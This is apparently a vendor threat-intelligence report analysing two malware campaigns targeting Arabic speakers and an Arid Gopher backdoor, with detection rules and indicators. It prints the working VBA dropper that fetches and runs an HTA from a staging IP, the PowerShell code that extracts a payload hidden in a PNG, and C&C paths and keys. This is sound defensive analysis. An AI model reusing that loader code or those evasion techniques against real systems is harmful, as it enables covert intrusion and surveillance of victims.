## Executive summary

Between May and August 2026 we collected fourteen files from two delivery chains aimed at Arabic-speaking users in the Middle East, plus one unrelated Go tool using the same lure theme. The first chain runs from a macro-enabled Word document through an HTA dropper to a Go backdoor hidden inside a PNG. The second hides a C++ libcurl implant in a 200 MiB VHDX container, where the payload never receives the Mark-of-the-Web. The two chains share a target audience and a staging address, but no implant, C&C domain or persistence mechanism.

No technique in the set is new. What distinguishes it is the combination, the quality of the decoys and the care taken to keep every stage ordinary. The libcurl implant is the better built of the two, with AES-256-GCM, PBKDF2, reported decryption failures and a decoy that changes between builds. The Go backdoor is the more transparent, because its function metadata survives stripping and describes the tool in detail.

Attribution is uneven. The DWApp sample is the backdoor ESET calls Arid Gopher and attributes to Arid Viper, also tracked as APT-C-23 [1]. Its C&C host, persistence branch and lure document all match, so we assess with high confidence that it is Arid Gopher activity. The two campaigns share the lure themes and targeting ESET records but match no published indicator, so our confidence that they are also Arid Viper work is moderate. We make no sponsorship judgement.

**Key findings**

- A macro document with reversed strings and concatenated COM names fetches `helpss.hta` from `45.56.162[.]130` and starts it through WMI, so neither `mshta.exe` nor the URL appears in a simple static scan.
- Two HTA variants download an Arabic questionnaire, remove its Zone.Identifier with `Unblock-File`, and extract a Go backdoor from a PNG. The XOR key is a byte read from the image, and the encrypted data begins immediately after the `IDAT` chunk type.
- The Go backdoor, dropped as `NetworkService.exe`, persists through the Run value `HostHelpLoader`, beacons to `mmarketplaces[.]com`, and supports screenshots, a command shell, file and directory exfiltration, audio recording and execution of an uploaded binary with a UAC prompt.
- The libcurl implant is delivered on a 200 MiB VHDX volume as a single 4 MB executable. It persists through a Startup link named `AudioClassification.lnk`, or through a scheduled task named `\WindowsFormsIntegrationDesign` when Kaspersky is installed, and it skips persistence entirely when it finds no antivirus.
- The two campaigns reuse one staging address and a shared naming habit but no implant code, which points to a common operational playbook rather than a shared build.

## Introduction

The samples arrived as a mixed collection: Arabic-language survey documents, small HTA scripts, VHDX disk images each holding one executable, a Go backdoor, three builds of a C++ libcurl implant, and one unrelated Go tool.

We describe the two campaigns separately because they do not interact. Campaign 1 targets the mail and browser path and depends on the victim enabling a macro. Campaign 2 targets the file-system path and depends on the victim mounting a disk image and double-clicking a document icon. Language, persistence, cryptography and C&C protocol all differ. The overlap is in targeting and tradecraft, not in code or infrastructure.

## Campaign 1: from a macro document to a Go backdoor

The first campaign has four stages. A Word document runs VBA that downloads and starts an HTA file. The HTA opens a decoy questionnaire and downloads a PNG. The PNG carries an encrypted Go backdoor, which the HTA extracts and runs. Each stage is present in the sample set, so the chain is supported end to end rather than inferred from a single file.

### The macro document

The macro document is a macro-enabled Word file with an empty visible body. Its content is the VBA project in `vbaProject.bin`, and the only module is `ThisDocument.cls`. The module declares a `WithEvents` application object, so the code runs from document-level events rather than from a standard `AutoOpen` routine. Four handlers call the same routine: `Document_Open`, `Document_Close`, `App_DocumentBeforePrint` and `App_WindowSelectionChange`. The first fires when the file opens; the other three act as retries if that attempt fails, or when the victim prints the document or changes the selection.

Every string that would identify the behaviour is split in the source and rebuilt at run time. The URL is stored reversed, and the COM object names are concatenated from fragments.

```vba
p1 = "ath.sspleh/tnetnoc/031.261.65.54//:ptth"
p2 = "ath.cod_pleh\"
url = De(p1)                                  ' http://45.56.162.130/content/helpss.hta
localPath = Environ("TEMP") & De(p2)          ' %TEMP%\help_doc.hta
Set http = CreateObject("MS" & "XML2" & ".XML" & "HTTP")
Set stream = CreateObject("AD" & "ODB" & ".Str" & "eam")
objProc.Create "ms" & "hta" & ".exe " & localPath, Null, Null, id
```

`De` is `StrReverse`. The object names are assembled so that a static scan for `MSXML2.XMLHTTP`, `ADODB.Stream` or `mshta.exe` returns nothing. The file is written to `%TEMP%` as `help_doc.hta` while the URL names it `helpss.hta`, a mismatch that breaks URL-to-file correlation in simple proxies and in most user-facing prompts.

The launch is indirect as well. The VBA does not call `Shell` or `WScript.Shell`; it asks WMI to create the process through `Win32_Process.Create`, which gives `mshta.exe` a parent of `WmiPrvSE.exe` rather than `WINWORD.EXE`. Detection logic that expects Office to spawn a script host will miss it.

### The HTA dropper

We recovered two HTA variants. Both are plain text of about a kilobyte, and both open a decoy document before retrieving and decrypting the payload. They differ in the decoy, the carrier image and the offset of the key byte.

Variant 1 opens the decoy with PowerShell, using the `0` argument to `shell.Run` to keep the window hidden. The command is a single `powershell -Command` string that downloads the document to `%TEMP%\1995.docx`, calls `Unblock-File` on it and starts it.

`Unblock-File` removes the Zone.Identifier alternate data stream attached to the download. The decoy then opens without Protected View and without the warning bar, which is the difference between a document that opens quietly and one that asks the victim to click Enable Editing.

The second branch downloads `view.png` from the same host into `%TEMP%`, reads it as a byte array, writes the decrypted executable to `%LOCALAPPDATA%\NetworkService.exe` and starts it with `cmd /c`. The extraction itself is described in the next section. Table 1 lists the differences between the variants.

Table 1. HTA dropper variants.

| Variant | Decoy | Carrier | Key byte |
|---|---|---|---|
| 1 | `1995.docx` | `view.png` | `$data[185]` |
| 2 | `421062026.docx` | `ViewData.png` | `$data[123]` |

Both loaders write `%LOCALAPPDATA%\NetworkService.exe` and start it with `cmd /c`. In variant 2 the file name matches the name in the URL and in variant 1 it does not, which is enough for a path-based proxy rule to miss one of them.

### Extracting the payload from a PNG

The carrier is a valid PNG up to the `IDAT` chunk, so a proxy can render it, a mail gateway can preview it, and a user who opens it sees a picture rather than a damaged file. The encrypted payload sits inside the chunk data area, immediately after the four bytes that spell `IDAT`. It is not an overlay appended after `IEND`, the older and more commonly detected pattern.

The key is not hardcoded: the script reads one byte from a fixed offset, `$data[185]` in variant 1 and `$data[123]` in variant 2, and XORs everything from the end of the `IDAT` type field to the end of the file. The same script therefore works with any image the actor prepares, and a defender who recovers the script learns the offset but not the key. The image is the key material, which ties the loader and the carrier together.

The code that does this is short. The offset supplies the key, the `IDAT` search finds the first byte of payload, and the remainder is a XOR loop:

```powershell
$key  = $data[185]                      # $data[123] in variant 2
$i    = [Text.Encoding]::ASCII.GetString($data).LastIndexOf('IDAT') + 4
[IO.File]::WriteAllBytes($out, ($data[$i..$data.Length] | ForEach-Object { $_ -bxor $key }))
```

The result passes an image parser, has a plausible size for a photograph or illustration, and carries an executable in a region most content scanners do not inspect. A scanner that walks PNG chunks will see an `IDAT` chunk whose declared length does not match the remaining data unless it also accounts for the appended payload. A scanner that checks only the file header and the end marker sees a normal image.

### The Go backdoor

The payload extracted from the PNG is a Go backdoor written to `%LOCALAPPDATA%\NetworkService.exe`. The name belongs to a Windows service host component, which is why we use it as the family label. Its job is to keep the host available: it establishes persistence at startup, profiles the machine, and waits for commands covering collection, file transfer and execution of further tools. At 9,055,760 bytes it is the largest executable in the set, and most of that weight is the Go runtime and linked libraries rather than the implant's own logic.

#### The file on disk

The sample is a PE32+ x64 image for the Windows GUI subsystem, unsigned, with a zero PE timestamp. It has eleven sections, five of them carrying content: `.text` at 4,798,768 bytes of compiled code, `.rdata` at 3,600,064 bytes of strings, type metadata and read-only tables, `.data` at 410,560 bytes of initialised globals, and `.pdata` with `.xdata` holding the unwind information Go emits for every function. The rest is loader bookkeeping: `.edata`, `.idata`, `.tls`, a 1,256-byte `.rsrc` and `.reloc`.

The largest section is the one that never appears in the file. `.bss` is declared at 33,917,744 bytes of virtual space with no raw data behind it, which is the Go heap reservation and the per-processor structures the scheduler allocates at startup. It explains why a 9 MB file maps tens of megabytes of address space when it runs.

The import table is short: 121 functions from `KERNEL32.dll`, 56 from `msvcrt.dll`, and nothing else. There is no `winhttp.dll`, no `wininet.dll` and no `ws2_32.dll`. Go reaches networking and DNS through its own syscall layer at run time, so a defender reading only the import table sees a program with no evident network capability.

The build record is intact and shows how the file was produced:

```
go1.26.0
-buildmode=exe
-compiler=gc
CGO_ENABLED=1
GOOS=windows
GOAMD64=v1
-ldflags="-s -w -H=windowsgui -X main.buildID=random123"
```

Three flags matter. `-H=windowsgui` marks the image as a GUI program, so Windows attaches no console window at start. `-s -w` strips the COFF symbol table and the DWARF debug information, which removes the usual source-level names from the file. The third sets a build identifier to the literal string `random123`, which reads as a placeholder left in a build template. Stripping does not hide the code structure: Go keeps its own function metadata in `pclntab`, and that table survives, which is why the function tree, package paths and type names are recoverable despite the linker flags.

The main package is recorded as `command-line-arguments`, the name Go writes when `go build` receives a list of files rather than a module path. The developer therefore built the implant from a directory of sources with no module file. The recorded source paths mix Windows and Unix forms, which suggests the dependency cache was populated on a macOS host and the final link ran on Windows. Neither observation identifies anyone, but together they describe a small ad hoc build process rather than a maintained codebase.

The linked modules show what the tool is for. Screen and microphone capture come from `screenshot` and `malgo`, host inventory from `gopsutil` and WMI, and the Windows calls underneath from `w32` and `lxn/win`. `go-ole` supplies the COM layer and `x/sys` the syscall layer. `go-sqlite3` has no obvious role in the command set and is the reason the build needs CGO. Nine libraries for eight commands is a high ratio: the developer assembled existing Windows components rather than writing capture and inventory code, and the size of the binary is the price.

#### Execution flow and persistence

At startup the backdoor runs a fixed sequence: persistence, then host profiling, then its collection workers, then the command loop.

1. It writes `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, value `HostHelpLoader`, pointing at the current image path.
2. It collects adapter MAC addresses for the `mac` field used at check-in.
3. It reads the OS version through `RTL_OSVERSIONINFOEXW` and the hostname.
4. It reads `MachineGuid` from `HKLM\SOFTWARE\Microsoft\Cryptography`.
5. It switches its working directory to `C:/`.
6. It starts six background workers at once: one captures screenshots, one enumerates installed programs, three upload directory trees and selected paths, and one prepares execution of a payload with administrator rights.
7. It sends a first heartbeat, starts the task runner and enters a loop that keeps the host registered and waits for commands.

Task state is a JSON file named `tasks.json` in the install directory. Each entry carries an action, a start time and a repeat interval, and the runner writes recordings as `recording_%d.wav`. Because the file stays on disk, a scheduled job remains visible after the C&C server is gone.

The `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall` key is read only, to enumerate installed programs for the `InstalledPrograms` command. It is not used for persistence. Persistence is the Run key alone, and the value name `HostHelpLoader` reads like a help or support component rather than a backdoor.

#### C&C protocol

All traffic goes to `mmarketplaces[.]com` over HTTPS. The endpoints are JSON over POST and GET, and the names are a mix of a plausible user API and unrelated web application paths.

Table 2. Go backdoor C&C endpoints.

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/Persons` | POST | Initial check-in |
| `/api/Persons/heartbeat` | POST | Keep-alive with host data |
| `/api/Persons/check-commands/%s` | GET | Poll for a queued command |
| `/api/Persons/submit-result` | POST | Command output, text |
| `/api/Persons/submit-result-file` | POST | Command output, file |
| `/api/AutoSliders/files` | POST | File listing stage |
| `/api/AutoSliders/upload` | POST | File upload |
| `/api/AutoSliders/PostSlider` | POST | Screenshot upload |
| `/api/Persons/upload-tree` | POST | Directory tree upload |
| `/api/InstallSys/BulkPost` | POST | Installed-program inventory |

The `/api/AutoSliders` and `/api/InstallSys` namespaces do not match `/api/Persons`. They read as paths borrowed from unrelated applications, so request logs on a shared or compromised host look like ordinary traffic from a site with several modules.

#### Command set

The dispatcher compares the `type` field against a fixed table. The compiler inlines part of the comparison, so two tokens survive only as eight-byte prefixes in the code, `FetchFil` and `RecordSo`, while the others appear as ordinary strings. Table 3 lists the handlers recovered from the comparison and the surrounding code.

Go backdoor command handlers.

| Token | Length | Effect |
|---|---|---|
| `ScreenShot` | 10 | Capture the desktop, save as `2006-01-02_%dx%d.png`, upload to `/api/AutoSliders/PostSlider` |
| `InstalledPrograms` | 17 | Enumerate the Uninstall hive in the 64-bit and 32-bit registry views, format `%d: %s`, post to `/api/InstallSys/BulkPost` |
| `EXEFILE` | 7 | AES-CBC decrypt an uploaded executable, write it to disk, run it through `ShellExecuteW` with the `runas` verb |
| `FetchFilesByDate` | 16 | Parse two timestamps in `2006-01-02T15:04:05` format, walk the tree, upload matching files; a `*` path selects the six-argument variant |
| `RecordSound` | 11 | Queue a WAV recording task in `tasks.json`; the task runner writes `recording_%d.wav` |
| `Commands` | 8 | Run `cmd /c <args>` and return the output through `/api/Persons/submit-result` |
| `FileTree` | 8 | Enumerate drives A through Z and upload the directory tree |
| `DOWNLOAD:<path>` | 9 or more | Read the named file and post it with a `FILE_READY:` marker |

The `runas` branch is the escalation path. If the victim declines the UAC prompt, the handler logs `Failed to elevate or user denied UAC.` and stops. There is no local privilege escalation attempt. The implant is a delivery mechanism for an elevated payload supplied by the operator, not an exploit. That distinction matters for detection: the UAC prompt is the last control point before the payload runs.

The `EXEFILE` payload is decrypted with AES in CBC mode. The key is the literal ASCII string `1234567890123456`, stored beside a second 32-byte constant, `12345678901234567890123456789012`. Neither is random material, so a payload sent to the implant can be decrypted by anyone who holds the binary.

Audio capture is supported by the linked `malgo` library and by the `RecordSound` handler, although we did not observe a completed recording.

## Campaign 2: VHDX containers and the libcurl implant

The second campaign does not use a document, a macro or a script host. It ships an executable inside a virtual disk. Two containers were recovered, and each holds one build of a C++ implant that shares nothing with the Go backdoor except the lure theme and the naming habit.

### Container construction

Both containers are 104,857,600 bytes. They are standard VHDX images with a 200 MiB virtual disk (`0x0C800000`), a 32 MiB block size and only two allocated data blocks. The disk is GPT partitioned: a 16 MiB Microsoft Reserved partition followed by a 184 MiB basic data partition formatted with NTFS.

Table 4. VHDX containers and their contents.

| Container | Volume file | Size | Payload |
|---|---|---|---|
| Container 1 | `Political participation is a national responsibility for every young person Political division has negatively.exe` | 4,155,392 | August build |
| Container 2 | `Psychological stress and its relationship to mental health among university students.exe` | 4,151,808 | July build |

Each volume contains exactly one user file. Everything else in the MFT is NTFS metadata, which is what a formatted volume looks like when a single file has been copied onto it. The names read as academic survey titles rather than executables. With the Windows setting that hides known file extensions enabled, the victim sees a long document title and a document icon.

### Why the payload executes without a warning

A file opened from a mounted VHDX or ISO has no Zone.Identifier stream, so SmartScreen, Protected View and the "Windows protected your PC" prompt never fire, even though the container itself was downloaded and carries the mark. The technique is documented as T1553.005 [2] and its public history is discussed in Section 9.

The victim sees a disk mount followed by a double-clickable document icon: no archive password, no macro prompt, no script warning. The extension is `.exe`, but Windows hides it, so the icon and the name are all that show. It is the quietest initial execution path in the set.

### Implant builds

The implant is a 4 MB PE32 x86 image built with MSVC and statically linked. It contains libcurl, OpenSSL, SQLite 3 and nlohmann/json 3.12.0. There is no Go metadata and no PDB path. The builds differ in the base URL and in the name of the embedded decoy document; the mutex, staging paths, key material and request format are the same.

Table 5. libcurl implant builds.

| Build | PE timestamp | Base URL | Decoy document |
|---|---|---|---|
| July | 2026-07-28 13:25:34 UTC | `https://conakrymidi.net//api/jpv4urbWV2HF` | `\Psychological stress and its relationship to mental health among university students.docx` |
| August | 2026-08-08 09:45:57 UTC | `https://conakrymidi.net//api/jpv4urbWV2HF` | `\Political participation is a national responsibility for every young person Political division has negatively.docx` |
| Late August | 2026-08-31 08:38:51 UTC | `https://urawareimei-webdesign.com//api/jpv4urbWV2HF` | `\A political survey that focuses on youth issues and needs.docx` |

The double slash after the host is in the source, not a transcription error. A second set of paths sits beside the base URL:

```
/t1k3oPX0UjKx/
/nxBkQR7c/
/zWthkNz6/
/tzG3vnWQ/
/v3yZJUHM/
/bAgMgDGrZ/
```

These are fixed per build and act as per-command routes under the base path. The July build is 3,584 bytes smaller than the two August builds, which suggests a small source change rather than a different tool.

### Execution and persistence

The implant is built to run quietly from a document the victim opens, survive a reboot and give the operator a session. It parses the command line for `--service`. Without the flag it performs setup: mutex creation, decoy extraction and launch, antivirus checks and persistence. With the flag it skips setup and goes straight to the beacon loop. The persistence entries use that argument, so anything the implant creates starts a process that does not repeat the visible setup.

The mutex `Global\SystemAudioAuth_Protocol_v1` prevents multiple instances. First-run setup creates `%TEMP%\MilliebyBrownTechanimationGB2`, writes the embedded decoy into it, waits two seconds and opens it with `ShellExecuteA`, so Word or the registered handler shows the questionnaire while the implant continues in the background. Both the mutex name and the folder imitate audio and switching components, which keeps them unremarkable in a process or directory listing.

Two text files live beside the decoy. `SearchFilterHostbv.txt` stores the victim identifier: a small routine reads the file when present, and otherwise generates 20 random characters in the range A to Z, writes them there and reuses them for every check-in. The `<yyyy-mm-dd>.txt` files are request logs. The implant does not copy its own executable.

A sandbox trace of the third build follows the same sequence: the volume executable starts, the decoy appears under `%TEMP%\MilliebyBrownTechanimationGB2` and opens in Word, or in WordPad and the OpenWith broker when Word is absent. `SearchFilterHostbv.txt` appears as a small text file, and the dated logs accumulate as the implant talks to the server. The volume file is named after its decoy document, sharing the base name and swapping `.docx` for `.exe`.

The operator side is visible in the same trace. The `terminalValue` handler produced `cmd.exe` children running `ipconfig`, `ping`, `find` and `reg`, with PowerShell alongside them. A second executable appeared at `C:\hictxm\qijpa.exe`, in a randomly named directory outside the staging folder. Both download handlers write the decrypted payload to `WindowLanWlanWwanSwitchingServiceUW.txt`, copy it to a generated path, delete the temporary file, wait twelve seconds and open the copy with `ShellExecuteA`, so a randomly named executable is the expected shape of that stage. We have not recovered the file, so the destination template remains unconfirmed.

Persistence is set up after the decoy opens. The implant creates a ShellLink COM object that points at its own module path from `GetModuleFileNameW`, passes `--service`, and saves the link as `AudioClassification.lnk` in the user's Startup folder. When the antivirus query returns a product name containing `kaspersky`, it registers a scheduled task instead: `\WindowsFormsIntegrationDesign`, in the root task folder, running the same module path with `--service` and declaring `C:\Windows\System32` as its working directory. If the query returns `noavg` or an empty string, neither is written.

Skipping persistence on hosts without an antivirus is the opposite of what an installer would do. It fits an interest in hosts that look like real workstations, and it keeps the implant off analysis machines.

The campaigns share no drop path: the libcurl implant works from `%TEMP%\MilliebyBrownTechanimationGB2`, the Go backdoor writes a single file to `%LOCALAPPDATA%`. What they share is the idea of opening a decoy while the implant runs, not a directory or a filename.

### C&C protocol

Requests are JSON with a mix of short obfuscated keys and readable ones. The readable fields are `s_code`, `type`, `screenValue`, `terminalValue`, `downloadValue`, `downloadValueHex` and `result`. The rest are random six- to eight-character tokens generated per build. The `type` field selects the operation, and the matching `*Value` field carries its argument. The protocol is a flat request and response key-value exchange rather than a binary format. Outgoing requests are labelled `CheckRequest` in the debug strings.

Response handling parses `status`, `error`, `error_code` and `message`, with the fallbacks `UNKNOWN_ERROR` and `UNEXPECTED_ERROR`. That error vocabulary is not from libcurl. It belongs to the implant.

Before connecting, the implant requests `https://www.google.com` and retries up to three times. On failure it logs `No internet connection after 3 attempts`. The check gives the operator a way to distinguish a blocked network from a dead C&C server, and it produces a network event that a defender can use.

### Encryption, screen capture and file handling

Screen capture uses the Windows Imaging Component (`IWICImagingFactory`) and writes PNG through `CreatePNGEncoder`. Timestamps are formatted `%Y%m%d-%I-%M-%S`; dates use `%Y-%m-%d`.

Encryption uses AES-256-GCM through OpenSSL. Server responses carry `salt`, `iv`, `tag` and `ct`. The implant runs PBKDF2 over the 15-byte passphrase with the transmitted salt and 100,000 iterations to produce a 32-byte key, decrypts `ct` and checks `tag`. The failure strings `Failed to create context`, `Init failed`, `Key setup failed`, `Decrypt update failed` and `Auth failed: wrong key or corrupted data` show that decryption failures are reported rather than ignored. That is unusual in commodity remote-access tools and reads as a tool the operator debugs.

The passphrase `2HG}bn_R5^1dNtX` sits beside the `salt` and `iter` strings, and the decryption routine confirms the layout. The `.moh` string sits in the same cluster and is used as the extension for encrypted output.

### Capability claims not supported by the code

The binary statically links libcurl, which ships with AWS SigV4, SOCKS5 and proxy support compiled in by default. The strings `AWS_SIGV4`, `socks5h`, `socks4a` and `Negotiate` are library feature strings. Nothing in the code enables SigV4 signing or a SOCKS or Tor proxy. The network path is plain HTTPS to the configured host.

SQLite 3 is linked as well. The `SQLite format 3` header string, the parser and error messages, and the `sqlite3_extension_init` entry point are present in `.rdata`. We found no browser profile paths, no `Login Data`, `Web Data`, `Local State` or `Cookies` strings, and no queries that would read them. SQLite may be pulled in by the vcpkg build rather than used as a feature, and these files give no evidence that the implant harvests credentials.

These are the two places where a string-level report can go wrong. Both features are present in the binary and neither is evidence that it is used. Our assessment of capability is based on call sites, not on the presence of library strings.

## Lures and targeting

The decoy documents are working survey forms in Arabic, not empty shells. They carry headings, Likert scales and question numbering, and their titles cover administrative creativity and job performance, Palestinian foreign policy and international support, and youth political participation. The wording and subject matter point to government employees and human resources staff, diplomatic and political professionals, and students, activists and NGO workers across the Arabic-speaking Middle East.

The format matters as much as the language. A questionnaire invites a response, so a recipient who did not request it is still likely to open it and read a few lines, and nothing in the Arabic or the layout signals that the document is cover. None of the lures asks the reader to enable anything before it appears useful. The macro document is the exception: its body is empty and its only content is a VBA project, so it exists only to survive long enough to fetch the next stage.

The choice of topics is itself targeting. Workplace performance, foreign policy and youth participation reach people who handle internal documents, policy material or student records, and the survey format gives them a reason to keep the file. These are written for the readership the operator expected to reach, not generic Arabic documents with a payload attached.

## Separate sample: DWApp, the Arid Gopher backdoor

The DWApp sample follows the second campaign in this report, but it does not belong to either campaign. It is a Go build with an Arabic document lure that shares no code, C&C address, mutex or drop path with the other implants. It is also the sample ESET describes in its Q2 to Q3 2026 APT activity report as the new version of the Arid Gopher backdoor, where the same host, persistence logic and lure document are attributed to Arid Viper [1]. We include it because it applies the same social-engineering idea with a different toolchain, and because it is the one file in the collection that public reporting places in a named actor's hands.
### Execution flow

The tool opens a document the victim expects, keeps one instance alive and gives the operator a remote shell with file, screen and inventory capabilities. It creates `C:\ProgramData\WindowsNetworkSystem` and works from that directory. A mutex named `AboveLockAppHost` enforces a single instance, and the name copies a Windows shell host, so it does not stand out in a list of named objects.

The lure is a base64 literal decoded at run time into `اسئلة دكتورة فارسين.docx` ("Dr. Farsin's questions"). It is a real Word file stored in `.rdata`, with 12 ZIP entries including `word/document.xml`. The tool writes it to a `files\` directory, copies it to `tmp` and opens it through `cmd /c start`, falling back to PowerShell.

Persistence is a `Startup\OfficeClickToRun.lnk` that runs the sample with the argument `-q`; when the link cannot be written, it registers a task named `\OfficeClickToRun` with the same target. The check for an installed product named `360 total security` comes before the choice, and on hosts that run it the scheduled task is the branch taken, an evasion decision rather than a regional one. A device identifier goes to `PFRO.log` and request history to `setuperr.log`, both borrowed Windows log names.

### C&C and commands

The host is `kanreki[.]net` with the base path `/P9Iuq2YAfH`, stored as one literal. URLs are assembled from `%s://%s%s`, the scheme selects HTTP or HTTPS, and requests carry `DUID` and `User-Agent` headers set at startup.

Table 6. DWApp C&C routes.

| Route | Purpose |
|---|---|
| `/y10q2H1Tfg` | Device registration and check-in |
| `/8vvVUxEjkz` | Fetch the next task |
| `/8vvVUxEjkz/f6e5f6e5` | Command output |
| `/8vvVUxEjkz/vm5cxfe` | Task status |
| `/r98etr87g/x6a56a` | Additional payload download |

Bodies are JSON and use the fields `id`, `status`, `result`, `data`, `files`, `t`, `c` and `d`. Failures are reported as `Server return code %d when connecting to %s`.

Table 7. DWApp capabilities.

| Capability | Effect |
|---|---|
| Command shell and PowerShell | Run either interpreter, with or without returning output |
| File download and execution | Retrieve a file into the working directory and start it |
| Application launch | Start an application |
| Screen capture | Capture the desktop and save it as a `.jpg` |
| Host and security product inventory | Collect host and user details, including the installed antivirus through WMI |

An antivirus query reads `AntivirusProduct` from `root\SecurityCenter2`; other queries supply the host and user details. The combination gives the operator a shell, PowerShell, file execution, screenshots and a picture of the host without a second tool.

## Infrastructure

### Staging and C&C

The first campaign uses one staging address, `45.56.162[.]130`, for the HTA, both decoy documents and both PNG carriers. The address sits in a CrownCloud allocation under AS199959. At the time of the passive lookup the covering /24 was not announced in the global routing table. We did not connect to it.

The second campaign uses two C&C domains, `conakrymidi[.]net` for the July and August builds and `urawareimei-webdesign[.]com` for the late August build. The Go backdoor uses `mmarketplaces[.]com`, and the separate DWApp sample uses `kanreki[.]net`, which ESET names as the Arid Gopher C&C in its Q2 to Q3 2026 report [1]. The other three domains returned no malware-related match in public indexes.

The domain naming is worth a note. The 2020 Arid Viper infrastructure that Team Cymru mapped used human-name-themed registrations under `.info`, `.icu` and `.live` [3]. The domains in this set are longer, use `.com` and `.net`, and read like ordinary small-business or design sites. That divergence weakens the consistency argument and is one reason the two campaigns stay at moderate confidence. The DWApp sample does not depend on it, because its anchor is a published artefact match rather than a naming pattern.

The habit supports a consistency argument but does not on its own link the samples to a named actor. Masquerading is common across many families, and these names come from the same public Windows component list any developer can read.

## Attribution

MITRE's G1028 records the cluster as APT-C-23, also known as Arid Viper, Mantis and Desert Falcon, with victimology centred on the Palestinian territories [5][6][7]. ESET's 2026 activity report names the Arid Gopher backdoor, the `kanreki[.]net` C&C, the `OfficeClickToRun` persistence branch and the Dr. Farsin lure [1], and the DWApp sample carries all four. A match on infrastructure, persistence logic and lure content at once supports high confidence that the file is Arid Gopher, and therefore Arid Viper activity. The two campaigns share the victimology and the masquerading habits, but no indicator matches public reporting, no code was compared with a known family, and the domain naming departs from the pattern Team Cymru mapped in 2020 [3]. We therefore assess at moderate confidence that they are the same actor, which is the most these findings support. Sponsorship stays open: ESET calls the actor Hamas-affiliated, Meta could not confirm the link, and Sekoia and Symantec use qualified language [7][8][4][1]. We name the tooling and make no sponsorship judgement.

### Nextron rule coverage

Our public Valhalla rule set covers most of this sample set without any bespoke rule. The rules are behavioural rather than family-specific, so they do not depend on a hash or on a unique string that the operator can change in the next build.

Table 9. Valhalla rules that match this set.

| Rule | Stage it matches |
|---|---|
| [`SUSP_Office_Macro_VBA_AutoExec_Combo_Nov22`](https://valhalla.nextron-systems.com/info/rule/SUSP_Office_Macro_VBA_AutoExec_Combo_Nov22) | Macro document: several document-level auto-exec handlers in one module |
| [`SUSP_VBS_Exec_External_Command_May25`](https://valhalla.nextron-systems.com/info/rule/SUSP_VBS_Exec_External_Command_May25) | VBA that starts an external process |
| [`SUSP_HTA_PS1_PowerShell_May22_1`](https://valhalla.nextron-systems.com/info/rule/SUSP_HTA_PS1_PowerShell_May22_1) | Both HTA variants |
| [`SUSP_PS1_Downloader_Indicators_Sep26`](https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_Downloader_Indicators_Sep26) | Hidden download and `Unblock-File` in the HTA |
| [`SUSP_PS1_Loader_Indicators_Dec23_1`](https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_Loader_Indicators_Dec23_1) | PowerShell loader structure in the HTA |
| [`SUSP_PS1_OFBUSC_XOR_Encryption_Aug23`](https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_OFBUSC_XOR_Encryption_Aug23) | XOR loop that extracts the payload from the PNG |
| [`SUSP_Go_PE_Characteristics_Jan24_2`](https://valhalla.nextron-systems.com/info/rule/SUSP_Go_PE_Characteristics_Jan24_2) | Go build metadata in both Go executables |
| [`SUSP_GO_Screenshot_Capable_Oct22`](https://valhalla.nextron-systems.com/info/rule/SUSP_GO_Screenshot_Capable_Oct22) | Screenshot capability in both Go executables |

Taken together, the rules match the macro document, both HTA variants, the extraction script and both Go executables. That covers every stage of Campaign 1 and the DWApp sample.

The VHDX stage is the exception. Of the rules listed here, none targets an MSVC binary inside a virtual disk, and a generic rule broad enough to fire on a statically linked libcurl program would also fire on legitimate software built the same way. For Campaign 2 the host telemetry in Section 10.1 carries most of the detection weight, starting with the container download and the mount.

## Conclusion

The two campaigns are built to defeat two different layers of the Windows trust model. The first targets the mail and browser path: a macro document the victim enables, then an HTA that Microsoft signed and that runs without a warning, then an image file that a proxy can render and a human can preview. The second targets the file-system path: a mounted container whose contents never receive the Mark-of-the-Web, so a 4 MB executable on the volume runs as if it had been built locally.

Neither chain relies on an exploit. Both depend on the victim opening something that looks like the survey it claims to be, and on the payload being named accordingly. The Go implant is the more observable of the two because its symbols survive, but the libcurl implant is the more carefully written. Literal key material aside, its error handling, its build-specific decoy document and its method naming show an operator who iterates on the tool between builds.

The separate DWApp sample makes the same point from a third angle. It carries no document until it runs, opens an exam paper written for the same audience, and settles behind a persistence link named after an Office component. It is also the only file here that a public report identifies by name, and that identification rests on artefacts an analyst can read from the binary without any help from the operator [1].

For defenders, the practical lesson is that the document is not the payload and the container is not the payload. The payload is the file that runs after the victim has been persuaded. Detection has to follow the chain across the document, the script host, the image, the mounted volume and the persistence entry, because each stage is designed to look ordinary on its own.

## Indicators of compromise

### Files

| SHA-256 | Description |
|---|---|
| `bc21c0cfa9af29fdfbed7debf6c46c6ae395dc6ee4dadcb12f3b143d29ee3856` | Macro-enabled Word document (VBA dropper) |
| `4110481d476d35251269009a51a2db80a855c0f576ab87cd39587c2bb4161298` | HTA dropper variant 1 (saved as `help_doc.hta`) |
| `eeab260fef2d538abbee63e0e82ada70591adf467c00f1803a078e084cc8bb82` | HTA dropper variant 2 |
| `2959385a23197296bdbd1508213102ecc503c0a91655805de2fc8f9afcfc029d` | Go backdoor, PE32+ x64 (`NetworkService.exe`) |
| `8e21d9db7e06b834c76270d5a26b0a443c92dc3f27fa0722e9217b0c8d5d9334` | libcurl implant, build 2026-08-31 |
| `971d1bc7f3857227574e49b846a1265f77baa12ae0a8cbc4e83238956a9348b9` | libcurl implant, build 2026-08-08 |
| `d4b266649018ff5b49314f81140bc353236f094f7140141f667151154c5e52d6` | libcurl implant, build 2026-07-28 (carved from VHDX) |
| `bf548292a63c90ac8607aec358b4cbd5a5a5a6902a35f4b9e4b135c597f69804` | Go 1.20 remote-access tool, module `DWApp` |
| `520a44c21283013adac93db06f84f86eabcc280d56df235ce841aaa5a9e1b226` | VHDX delivery container 1 |
| `f4c351880de9ac9a17e533d2ca65df569045f368e4316fff13602f41b53b6011` | VHDX delivery container 2 |
| `0f509f1ec9735b9c141e168b37eabcdcaa222d7e80371e9de15c1b1ff7d6bb8a` | Decoy, administrative-creativity survey |
| `637302c99030a371cd0814041d8b212e073e62daf1755e7cf230c28b8b48c56f` | Decoy, Palestinian foreign policy questions |
| `675ddfe4b9303c7185a6dabaa99e7ef4785492dca0cd69f5dc76ff7c6bd0c337` | Decoy, administrative-creativity survey (second copy) |
